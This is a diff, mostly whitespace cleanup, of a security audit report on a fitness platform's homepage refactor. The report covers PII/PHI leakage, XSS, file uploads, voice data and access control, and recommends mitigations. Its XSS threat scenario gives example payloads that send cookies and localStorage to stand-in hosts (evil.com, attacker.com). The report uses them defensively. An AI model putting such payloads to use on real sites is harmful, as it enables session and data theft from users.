@@ -10,9 +10,9 @@
 
 # SECURITY AUDIT REPORT: SwanStudios Homepage & About Page Vision Refactor
 
-**Auditor:** Primary Security Lead  
-**Plan:** `docs/ai-workflow/blueprints/HOMEPAGE-ABOUT-VISION-REFACTOR-2026-04-05.md`  
-**Date:** 2026-04-05  
+**Auditor:** Primary Security Lead
+**Plan:** `docs/ai-workflow/blueprints/HOMEPAGE-ABOUT-VISION-REFACTOR-2026-04-05.md`
+**Date:** 2026-04-05
 **Status:** **BLOCKED** — Critical security gaps identified. Do not proceed to implementation.
 
 ---
@@ -36,21 +36,21 @@ The submitted plan is a **content/copy refactor** with minimal direct code chang
 
 ### 1. PII/PHI LEAKAGE IN AI CONVERSATION HISTORY
 
-**Risk Rating:** 🔴 **CRITICAL**  
+**Risk Rating:** 🔴 **CRITICAL**
 **Plan Relevance:** ⚠️ **Indirect** — Vision mentions "conversation history" but plan contains zero implementation details.
 
-**Threat Scenario:**  
-User asks AI Coach: *"What's a good workout for my knee replacement recovery?"*  
-→ Conversation stored in PostgreSQL JSONB contains:  
-- Medical condition (PHI)  
-- Location (if user mentions "gym in [city]")  
-- Trainer name (if user references their trainer)  
-- Exact workout metrics (health data)  
+**Threat Scenario:**
+User asks AI Coach: *"What's a good workout for my knee replacement recovery?"*
+→ Conversation stored in PostgreSQL JSONB contains:
+- Medical condition (PHI)
+- Location (if user mentions "gym in [city]")
+- Trainer name (if user references their trainer)
+- Exact workout metrics (health data)
 
-If this data is:  
-a) Sent to external LLM APIs **without redaction** → HIPAA/GDPR violation  
-b) Stored without encryption at rest → Database breach exposes health history  
-c) Lacks access controls → Any authenticated user could query others' conversations  
+If this data is:
+a) Sent to external LLM APIs **without redaction** → HIPAA/GDPR violation
+b) Stored without encryption at rest → Database breach exposes health history
+c) Lacks access controls → Any authenticated user could query others' conversations
 
 **Required Mitigations (MUST be in implementation plan):**
 
@@ -65,11 +65,11 @@ const sanitizeConversation = async (text: string): Promise<string> => {
     language: 'en',
     categories: ['PERSON', 'LOCATION', 'MEDICAL_CONDITION', 'AGE']
   });
-  
+
   let sanitized = text;
   for (const result of results) {
     sanitized = sanitized.replace(
-      text.substring(result.start, result.end), 
+      text.substring(result.start, result.end),
       '[REDACTED]'
     );
   }
@@ -82,11 +82,11 @@ const sanitizeConversation = async (text: string): Promise<string> => {
 //   voice_transcripts BYTEA ENCRYPTED
 
 // 3. ROW-LEVEL SECURITY (RLS) policies:
-//   CREATE POLICY user_is_owner ON conversations 
+//   CREATE POLICY user_is_owner ON conversations
 //   USING (auth.uid() = user_id);
 ```
 
-**Implementation Plan Requirement:**  
+**Implementation Plan Requirement:**
 Add a **"Security Requirements"** section specifying:
 - PII detection library (Microsoft Presidio or AWS Comprehend Medical)
 - Encryption keys management (AWS KMS / HashiCorp Vault)
@@ -97,11 +97,11 @@ Add a **"Security Requirements"** section specifying:
 
 ### 2. XSS VIA MARKDOWN RENDERING (Social Ecosystem)
 
-**Risk Rating:** 🔴 **CRITICAL**  
+**Risk Rating:** 🔴 **CRITICAL**
 **Plan Relevance:** ✅ **Direct** — "Beyond the Gym" section will render user-generated markdown content.
 
-**Threat Scenario:**  
-User posts in "Comedy" section:  
+**Threat Scenario:**
+User posts in "Comedy" section:
 ```markdown
 ![x](https://evil.com/steal?cookie=document.cookie)
 <script>fetch('https://attacker.com/steal', {body: localStorage})</script>
@@ -139,18 +139,18 @@ const SanitizedMarkdown = ({ content }: { content: string }) => {
       components={{
         // Custom renderers to enforce additional rules
         a: ({ href, children }) => (
-          <a 
-            href={href} 
-            target="_blank" 
+          <a
+            href={href}
+            target="_blank"
             rel="noopener noreferrer" // Prevent tabnabbing
           >
             {children}
           </a>
         ),
         img: ({ src, alt }) => (
-          <img 
-            src={src} 
-            alt={alt || ''} 
+          <img
+            src={src}
+            alt={alt || ''}
             loading="lazy"
             // Add Content Security Policy (CSP) nonce if needed
           />
@@ -163,18 +163,18 @@ const SanitizedMarkdown = ({ content }: { content: string }) => {
 };
 ```
 
-**Implementation Plan Requirement:**  
-- Specify `rehype-sanitize` as a dependency  
-- Define **strict allowlist** of markdown elements/attributes  
-- Add **Content Security Policy (CSP)** headers:  
-  `Content-Security-Policy: default-src 'self'; img-src https: data:; script-src 'self' 'nonce-{RANDOM}';`  
+**Implementation Plan Requirement:**
+- Specify `rehype-sanitize` as a dependency
+- Define **strict allowlist** of markdown elements/attributes
+- Add **Content Security Policy (CSP)** headers:
+  `Content-Security-Policy: default-src 'self'; img-src https: data:; script-src 'self' 'nonce-{RANDOM}';`
 - **DO NOT** use `dangerouslySetInnerHTML` anywhere in new sections
 
 ---
 
 ### 3. FILE UPLOAD ATTACK VECTORS (Image Analysis to R2)
 
-**Risk Rating:** 🔴 **CRITICAL**  
+**Risk Rating:** 🔴 **CRITICAL**
 **Plan Relevance:** ⚠️ **Indirect** — Vision mentions "image uploads for AI analysis" but plan lacks controls.
 
 **Threat Scenarios:**
@@ -235,17 +235,17 @@ const presignedUrl = await getSignedUrl(r2Client, new PutObjectCommand({
 }), { expiresIn: 300 }); // 5 minutes
 ```
 
-**Implementation Plan Requirement:**  
-- Add **file upload security checklist** to plan  
-- Specify **ClamAV integration** or commercial scanner  
-- Define **R2 bucket policy** in infrastructure docs  
-- Add **quota/rate limiting** in API design  
+**Implementation Plan Requirement:**
+- Add **file upload security checklist** to plan
+- Specify **ClamAV integration** or commercial scanner
+- Define **R2 bucket policy** in infrastructure docs
+- Add **quota/rate limiting** in API design
 
 ---
 
 ### 4. VOICE DATA PRIVACY & BIOMETRIC RISKS
 
-**Risk Rating:** 🔴 **HIGH**  
+**Risk Rating:** 🔴 **HIGH**
 **Plan Relevance:** ⚠️ **Indirect** — "Voice-first AI coach" mentioned in vision but not in plan.
 
 **Threat Scenarios:**
@@ -300,20 +300,20 @@ if ('webkitSpeechRecognition' in window) {
 // Add to privacy policy: "Voice biometrics are used solely for authentication and are deleted after 30 days."
 ```
 
-**Implementation Plan Requirement:**  
-- Add **voice data processing addendum** to privacy policy  
-- Implement **consent management** before any `MediaRecorder` starts  
-- Specify **retention schedule** (e.g., raw audio: 24h, transcripts: 90d, redacted logs: indefinite)  
-- Consider **local-only processing** for simple transcription  
+**Implementation Plan Requirement:**
+- Add **voice data processing addendum** to privacy policy
+- Implement **consent management** before any `MediaRecorder` starts
+- Specify **retention schedule** (e.g., raw audio: 24h, transcripts: 90d, redacted logs: indefinite)
+- Consider **local-only processing** for simple transcription
 
 ---
 
 ### 5. ROLE-BASED ACCESS CONTROL (RBAC) GAPS
 
-**Risk Rating:** 🟠 **HIGH**  
+**Risk Rating:** 🟠 **HIGH**
 **Plan Relevance:** ✅ **Direct** — "Global Trainer Platform" implies multi-tenant data isolation.
 
-**Current Gap:**  
+**Current Gap:**
 The plan mentions "trainers bring their clients" but **no backend enforcement** described. Risk: Trainer A could access Trainer B's client data via API manipulation.
 
 **Required Mitigations:**
@@ -321,26 +321,26 @@ The plan mentions "trainers bring their clients" but **no backend enforcement** 
 ```sql
 -- PostgreSQL: Row-Level Security (RLS) policies
 -- Users table
-CREATE POLICY user_owns_profile ON users 
+CREATE POLICY user_owns_profile ON users
   USING (id = auth.uid());
 
 -- Clients table (belongs to trainer)
-CREATE POLICY trainer_owns_clients ON clients 
+CREATE POLICY trainer_owns_clients ON clients
   USING (trainer_id = auth.uid());
 
 -- Conversations table (belongs to user OR trainer's client)
-CREATE POLICY conversation_access ON conversations 
+CREATE POLICY conversation_access ON conversations
   USING (
-    user_id = auth.uid() OR 
+    user_id = auth.uid() OR
     user_id IN (
       SELECT client_id FROM clients WHERE trainer_id = auth.uid()
     )
   );
 
 -- Workout logs: same pattern
-CREATE POLICY workout_access ON workout_logs 
+CREATE POLICY workout_access ON workout_logs
   USING (
-    user_id = auth.uid() OR 
+    user_id = auth.uid() OR
     user_id IN (
       SELECT client_id FROM clients WHERE trainer_id = auth.uid()
     )
@@ -362,7 +362,7 @@ export const requireTrainer = async (req: Request, res: Response, next: NextFunc
 router.get('/my-clients', requireTrainer, clientController.list);
 ```
 
-**Implementation Plan Requirement:**  
+**Implementation Plan Requirement:**
 - Define **role hierarchy**: `admin` > `trainer` > `user`
 
 ---
@@ -383,7 +383,7 @@ The Secondary Security Planner (Nemotron 3 Super) agrees with all security findi
 - **Database Encryption:** Enforce PostgreSQL `pgcrypto` encryption at rest for `conversation_history` (JSONB) and `voice_transcripts` (BYTEA) using keys managed via AWS KMS or HashiCorp Vault. *Clarification:* Rotate keys every 90 days; audit key usage via CloudTrail/Vault logs.
 - **Row-Level Security (RLS):** Apply policies as specified:
   ```sql
-  CREATE POLICY user_is_owner ON conversations 
+  CREATE POLICY user_is_owner ON conversations
   USING (auth.uid() = user_id);
   ```
   *Clarification:* Ensure `auth.uid()` is derived from a verified JWT (e.g., via Supabase Auth or custom middleware) and enable `row_security` on relevant tables.
@@ -449,4 +449,3 @@ All mitigations must be reflected in:
 **Final Note:** The Primary's report is technically sound and actionable. The Secondary affirms that addressing these points is non-negotiable before proceeding to implementation. No further disputes are raised.
 
 ---
-
